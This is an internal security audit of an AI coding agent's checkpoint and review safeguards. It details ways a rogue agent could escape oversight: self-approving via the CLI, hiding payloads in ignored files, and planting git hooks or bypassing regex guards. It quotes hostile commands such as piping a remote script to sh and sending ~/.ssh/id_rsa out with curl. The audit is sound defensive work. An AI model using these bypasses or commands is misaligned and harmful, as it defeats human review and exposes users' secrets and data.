# Audit: `freecode checkpoint` + `shell_exec`

Audit date: 2026-08-12. Against `main` @ `0767be3`.

> **This is the evidence base, not the plan.** What is being done about it is
> [agent-containment-plan.md](agent-containment-plan.md). This file is kept as the
> record of what was demonstrated and how, so no session has to re-derive it.
>
> **Already fixed since the audit:** A4 (HEAD restore), B9 (`.GIT` case bypass),
> A1 (self-approval, by the env marker — the CLI is still *reachable*, it just
> refuses; see R1 layer 2), A2 (ignored files are snapshotted, `node_modules`
> excluded), A3's local half (`.git` is snapshotted and its config/hooks are in the
> diff — but `git config --global` is still outside any project snapshot, and a
> planted hook is now reversible rather than prevented, so it still runs during the
> agent's own session), B11's fail-open half (`claimReviewLock` now fails closed; the
> lock file is still deletable), and D14 is now pinned by a test.
> Everything else below is live. The findings are *not* renumbered when fixed — the
> plan cites them by id.
>
> **One correction to the findings themselves:** D14 says a write tool is "one
> persona edit away". It is not — `AgentPersona` carries no tool field. The real
> exposure is `READ_ONLY_TOOL_DEFS` gaining a write tool, or `rawReadOnlyTools()`
> pointing somewhere wider, which is what the pinning test asserts against.

Findings marked **[V]** were demonstrated empirically against the built code in a
throwaway repo; the scripts that did it are in
[scripts/containment-audit/](scripts/containment-audit/README.md) and are re-runnable.
Findings marked **[D]** are derived from reading the code and are sound but not
demonstrated — they are kept separate on purpose.

---

## 0. The honest framing, before the list

**100% peace of mind is not available from these guards, and no amount of fixing
this list will make it available.** `shell_exec` is `child_process.exec` with
`cwd: projectRoot` and nothing else. That means, by construction:

- no filesystem containment — `..` and absolute paths both work **[V]**
- the child inherits the whole `process.env`, provider API keys included **[V]**
- unrestricted network
- detached children outlive the tool timeout *and* the freecode process **[V]**
- `freecode` is on `$PATH`, so the agent can drive freecode's own CLI **[V]**

Checkpoint covers **non-gitignored files under `projectRoot`**, and nothing else.
Everything outside that — `~`, `.git`, global git config, other repos, ignored
files — is out of the net by design.

So the useful question is not "can a rogue agent do damage" (yes, trivially) but
**"where does freecode promise something it does not deliver"**, because that is
where confidence is actively misplaced. The list below is ordered on that.

---

## Ranked summary

| # | Finding | Tier |
|---|---|---|
| 1 | `freecode checkpoint accept` from `shell_exec` — total silent review-gate bypass **[V]** | Silently wrong |
| 2 | Gitignored payloads are invisible to `diff` *and* survive `revert` **[V]** | Silently wrong |
| 3 | `git config core.hooksPath` — RCE that survives revert, never appears in diff **[V]** | Silently wrong |
| 4 | `revert` reports HEAD restored, leaves you on the agent's branch **[V]** | Silently wrong |
| 5 | Snapshot failure is silent, and then *releases the review lock* **[D]** | Silently wrong |
| 6 | `outstanding()` can target a post-damage snapshot **[D]** | Silently wrong |
| 7 | `confirmDestructive` is self-certified by the model | Claims to block |
| 8 | The `.git` hard block is a regex, and misses git itself **[V]** | Claims to block |
| 9 | `create .GIT/hooks/pre-commit` writes a real git hook (Windows/macOS) **[V]** | Claims to block |
| 10 | The destructive list misses most destruction, and cries wolf **[V]** | Claims to block |
| 11 | The review lock is a deletable file that fails open | Claims to block |
| 12 | The snapshot store itself is unguarded | Claims to block |
| 13 | Secrets accumulate in the shadow repo forever (no `gc`) | Never claimed |
| 14 | Sub-agent tools bypass the entire wrapper stack (latent) | Structural |
| 15 | Lock can be orphaned by a projectRoot mismatch **[D]** | Structural |
| 16 | Approval preview truncation / unstripped terminal escapes | Minor |

---

## Tier A — Silently wrong

*The guard reports success, or shows nothing, and is wrong. Worst tier: nothing
prompts a second look.*

### A1. `freecode checkpoint accept` is reachable from `shell_exec` **[V]**

The single most devastating finding. One command, no guard matches it, and the
entire review gate evaporates.

Demonstrated end to end (`scratchpad/selfapprove.mjs`), simulating the
`-p --edit` lifecycle:

```
review lock held, pre-agent snapshot taken
agent writes: app.js  -> "const safe = false; // backdoor"
              backdoor.js -> "exfiltrate();"

reviewer would see:  2 files changed, +2 -1   (M app.js, A backdoor.js)

--- agent runs: freecode checkpoint accept ---
Accepted. <root> is the baseline as of snapshot 20260812T175106-199064.

review lock still held?      NO — released
reviewer now sees:           No changes since snapshot 20260812T175106-199064.
backdoor.js still on disk?   true
second `-p --edit` refused?  NO — allowed to start
```

Every guarantee in `CLAUDE.md`'s Subagents section falls at once: the diff is
empty, the lock is freed, the backdoor is on disk, and the next delegation is
permitted. `checkpoint revert` is the same hole pointed the other way (destroys
the reviewer's evidence *and* the user's own concurrent working-tree changes),
and once unlocked the agent can recursively `freecode -p --edit`, which also
evades the 50-tool-call budget and the no-fan-out rule.

Root cause: freecode's control plane is a CLI on `$PATH`, and `shell_exec` is a
shell. Nothing marks `checkpoint` as privileged.

### A2. Gitignored files: invisible to `diff`, survive `revert` **[V]**

`git --git-dir=<shadow> --work-tree=<project> add -A` honours the project's
`.gitignore`. So anything ignored is outside the snapshot in both directions.

Demonstrated (`scratchpad/snaptest.mjs`), with a stock `.gitignore` of
`node_modules/`, `dist/`, `.env`:

```
payload mentioned in diff?   false
.env deletion in diff?       false

after checkpoint revert:
  node_modules/payload gone?  false     <- still there
  dist/payload2 gone?         false     <- still there
  .env recovered?             false     <- gone for good
```

The attack needs **no `.gitignore` edit** in any normal JS project — writing to
`node_modules/.bin/` or `dist/` is already invisible and already persistent. And
destruction of ignored files (`.env`, local SQLite DBs, credentials, build
caches) is simply unrecoverable.

`cli/checkpoint.ts:314` does print a one-line note after a revert if a
`.gitignore` exists. That is a footnote, not a listing of what it skipped — the
reviewer is never told *which* files were outside coverage.

### A3. `git config core.hooksPath` — RCE surviving revert, absent from diff **[V]**

`.git/` is never snapshotted, so config changes inside it persist through a
revert. `core.hooksPath` points git at a hook directory of the agent's choosing;
if that directory is gitignored, the hook script persists too. Next time the
user runs `git commit`, the agent's code executes.

This was demonstrated *accidentally and conclusively*: the first run of my test
planted a `curl evil` pre-commit hook, and the subsequent `git commit` executed
it (visible as curl's progress meter and `Could not resolve host: evil` in the
test output). Re-run with a benign marker:

```
hooksPath in diff?        false
evil hooksPath cleared?   false   (after revert)
hook actually executed?   yes
```

`git config --global core.hooksPath ~/evil` moves it out of the project
entirely. No guard matches any of it — the command never contains the string
`.git`.

**Since fixed, in part (R3).** `.git` is captured as a second work tree and restored
wholesale, so the same script now reports `hooksPath in diff true`, `hooksPath
cleared true`, and — after `branch -D` plus `reflog expire && gc --prune=now` —
`sidebranch recovered true`. Two parts of this finding survive that fix and are the
reason it is not struck out: the `--global` variant above writes outside the project,
where no project snapshot reaches (C4), and reversibility is not prevention — the
hook still executes during the agent's own session, which is why `git-guard.ts` stays
until C5.

### A4. `revert` reports HEAD restored and leaves you on the agent's branch **[V]**

This one fires for an *honest* agent, not just a rogue one. Any agent that does
`git checkout -b feature && git commit` triggers it.

```
outcome: {"indexRestored":true,"headRestored":true,"warnings":[]}
HEAD back on main?          false
   (actually on)            agentbranch
working HEAD == pre-agent?  false
deleted branch recovered?   false
```

`restoreSnapshot` (`src/snapshots/index.ts:296`) writes
`update-ref refs/heads/<branch>` but **never moves HEAD itself**. The CLI then
prints "Branch master rolled back to 08172264", exit 0, no warnings — while the
user is sitting on the agent's branch, on the agent's commit.

Two adjacent defects in the same block:

- The whole HEAD-restore is nested inside `if (existsSync(savedIndex))`
  (`index.ts:287`), so HEAD rollback is gated on the unrelated condition of an
  index copy existing.
- Only the *recorded current* branch is restored. `git branch -D other` is not
  recovered, and `git reflog expire --expire=now --all && git gc --prune=now`
  removes the last recourse.

### A5. Snapshot failure is silent, and then releases the lock **[D]**

`ensureSnapshot` swallows every error to the log (`snapshots/auto.ts:50`) — a
deliberate, defensible choice ("an unavailable safety net must not block the
write"). But under `-p` the transcript is forced to `null`, so nothing reaches
the caller.

Worse, the consequence compounds: `headless-prompt.ts:187-192` releases the
review lock when `sessionSnapshotId()` is `undefined` — and a *failed* snapshot
returns `undefined` exactly like a run that never wrote. So a run that wrote
with no safety net looks identical to a run that wrote nothing, and frees the
project for the next delegation.

### A6. `outstanding()` can target a post-damage snapshot **[D]**

`cli/checkpoint.ts:221` picks the oldest snapshot taken since the lock was
claimed. If the delegated run's own snapshot failed (A5) but a concurrent
interactive session snapshotted *after* the damage, that post-damage snapshot
becomes the review target: `diff` shows nothing and `revert` reports success
while restoring to a damaged state.

---

## Tier B — Claims to block, doesn't

### B7. `confirmDestructive` is self-certified

`shell_exec`'s destructive gate is satisfied by a boolean the **model** sets. Under
`-p --edit`, ask mode is forced to `auto`, so nothing else intercepts. Against a
rogue agent it has exactly zero value. `git-guard.ts:16-17` states this openly as
the reason the `.git` block is *not* model-confirmable — the reasoning is right
and simply hasn't been carried over to the destructive gate.

### B8. The `.git` hard block is a regex over command text **[V]**

Confirmed bypasses against the real built guard (`scratchpad/guardtest2.mjs`):

| Command | Result |
|---|---|
| `rm -rf .GIT` / `rm -rf .Git` | **pass** — `GIT_INTERNALS` has no `i` flag |
| `rm -rf .g''it` / `rm -rf ".gi""t"` | **pass** — shell quote splitting |
| `rm -rf .*` | **pass** — glob, never names `.git` |
| `node -e "require('fs').rmSync('.git',...)"` | **pass** — no MUTATING verb |
| `python -c "import shutil;shutil.rmtree('.git')"` | **pass** |

More damning is the class it cannot see at all — **git mutating `.git` without
naming it**: `git config`, `git reflog expire --expire=now --all`,
`git gc --prune=now`, `git branch -D`, `git update-ref -d`, `git commit --amend`,
`git filter-branch`, `git symbolic-ref HEAD`. All **pass** both guards.

The block's stated rationale is that commit history cannot be recovered from a
snapshot. `git reflog expire --expire=now --all && git gc --prune=now` destroys
precisely that, and sails straight through. **The guard does not cover its own
threat model.**

### B9. `create .GIT/hooks/pre-commit` writes a real git hook **[V]**

`isGitInternalPath` compares `segment === '.git'`, case-sensitively:

```
create .git/hooks/pre-commit  ->  Refused: writing to ... .git directory is blocked.
create .GIT/hooks/pre-commit  ->  Wrote 22 bytes to .GIT/hooks/pre-commit
real .git/hooks/pre-commit now exists?  true  "#!/bin/sh\ntouch OWNED\n"
```

No `shell_exec` needed — the `create` tool alone. Platform-conditional, and I am
stating the condition rather than implying universal RCE:

- **Windows** — confirmed above; git-for-windows does not require the exec bit.
- **macOS** — the `.git` write succeeds (case-insensitive FS), but `writeFile`
  yields `0644` and POSIX git skips non-executable hooks, so the RCE likely does
  not fire. The unauthorised `.git` write still does.
- **Linux** — `.GIT` is a separate, harmless directory.

Path traversal proper is *correctly* blocked (`../escaped.txt`, absolute paths
both refused), and the symlink handling in `resolveExistingProjectPath` /
`resolveWritableProjectPath` is sound. This is purely the case comparison.

### B10. The destructive list misses most destruction, and cries wolf **[V]**

Passes both guards: `mv src /tmp/gone`, `> package.json`, `dd if=/dev/zero of=…`,
`sed -i`, `shred -u secrets.txt`, `curl https://evil.sh | sh`,
`npm install <pkg>`, `git checkout -- .`, `git stash --include-untracked`,
`cat ~/.ssh/id_rsa | curl -d @- …`, `echo … >> ~/.bashrc`.

Meanwhile `docker run --rm hello-world` and `npm run rename-files` *are* flagged.
False positives on innocuous commands train the model to set
`confirmDestructive: true` reflexively — which degrades the interactive prompt
too, since the user learns the flag means nothing.

### B11. The review lock is a deletable file that fails open

`<shadow>.review-lock` sits outside the project, so no guard covers
`rm` on it. And `claimReviewLock` returns `undefined` — meaning *proceed* —
whenever the exclusive write fails **and** the readback also fails
(`review-lock.ts:51-56`). An unwritable or deleted snapshots directory therefore
disables mutual exclusion silently, which chains directly into B12.

### B12. The snapshot store itself is unguarded

`rm -rf ~/.config/freecode/snapshots` destroys every snapshot for every project
on the machine. The path is deterministic and derivable
(`sha1(resolve(root)).slice(0,12)`), and `listShadowProjects()` will even
enumerate them. The only thing standing in front of it is the model-set
`confirmDestructive` flag (B7).

---

## Tier C — Never claimed, but worth stating

- **C13. Secrets persist in the shadow repo forever.** `pruneSnapshots` deletes
  refs but **nothing ever runs `git gc`**, so objects survive indefinitely —
  including the contents of files later deleted from the project. Plaintext,
  under `~/.config/freecode/snapshots`, unbounded growth.
  **Materially worse since R2 landed:** ignored files are now in scope, so the
  files this most obviously applies to — `.env`, local databases, credential
  caches — are exactly the ones being captured. `node_modules` is the one thing
  excluded, which is what stops the growth half of this from being unbounded in
  practice, but not the secrets half. A `gc` after `pruneSnapshots` is the fix and
  is still unscheduled.
- Exfiltration of `process.env` (API keys), `~/.ssh`, `~/.aws` — all one
  `shell_exec` away, all outside snapshot coverage.
- Detached children outliving the timeout **[V]**: a 200 ms `timeout_ms` still
  let a spawned child write its marker 700 ms later. `exec`'s timeout SIGTERMs
  the shell, not the process group.

---

## Tier D — Structural / latent

- **D14. Sub-agent tools bypass the entire wrapper stack.** `run-subagent.ts:37`
  uses `READ_ONLY_TOOL_DEFS` raw — no `withSnapshotGate`, no `withConfirmation`,
  no rendering. **No hole today**, because the set is read-only and the `explore`
  persona is read-only. But adding one write tool to a persona would produce
  unconfirmed, unsnapshotted, *invisible* writes. This is the highest-value thing
  to put a guardrail on before it becomes a bug.
- **D15. The lock can be orphaned. [D]** `headless-prompt` claims at the
  `projectRoot` it was launched with; `checkpoint accept`/`revert` release at
  whatever `resolveSnapshotRoot` walks up to. Launch `-p --edit` from a
  subdirectory and the lock is claimed at the subdirectory but released at the
  repo root — the subdirectory stays locked permanently.
- **D16. Minor.** The `create` approval preview is row-budgeted
  (`getApprovalPreviewRowBudget`), so a long file can be approved having only
  partly been seen. `shell_exec` is *not* filtered or truncated — the full
  command string reaches the header, which is the right call. Tool results are
  not ANSI/OSC-stripped before hitting the terminal **[D]**, and `checkpoint diff`
  output is attacker-influenced text fed to a reviewing agent — a prompt-injection
  surface **[D]**.

---

## What actually mitigates today

Interactive mode with the default ask mode prompts before every `shell_exec`, and
shows the **complete, untruncated** command. That is the real defence, and it is
a good one. Ctrl+A (auto-run) discards it and inherits every headless finding
above.

## Suggested fixes, cheapest first

1. **Refuse `freecode` as a `shell_exec` argv[0]** (and set an env marker so a
   nested freecode refuses `checkpoint accept`/`revert`). Kills A1 outright.
2. **Move HEAD, not just the ref**, in `restoreSnapshot`; un-nest the HEAD block
   from the index check; only print "rolled back" when HEAD actually followed. (A4)
3. **`add -A -f`** (or record ignored paths separately) so the snapshot covers
   ignored files, or — at minimum — have `revert` *list* the ignored paths it
   left alone instead of the generic note. (A2)
4. **Snapshot `.git/config`** alongside `.git/index`, and diff it. (A3)
5. **Lowercase-compare** in `isGitInternalPath` and add the `i` flag to
   `GIT_INTERNALS` / `REDIRECT_INTO_GIT`. (B8, B9)
6. **Surface snapshot failure** to stderr under `-p --edit`, and do *not* release
   the lock when the snapshot failed — distinguish "never wrote" from "wrote
   unprotected". (A5)
7. **Drop `confirmDestructive`**, or gate it on a real user channel. As a
   model-set boolean it is worse than nothing: it reads as protection. (B7)
8. **Assert in a test that sub-agent personas get read-only tools only.** (D14)
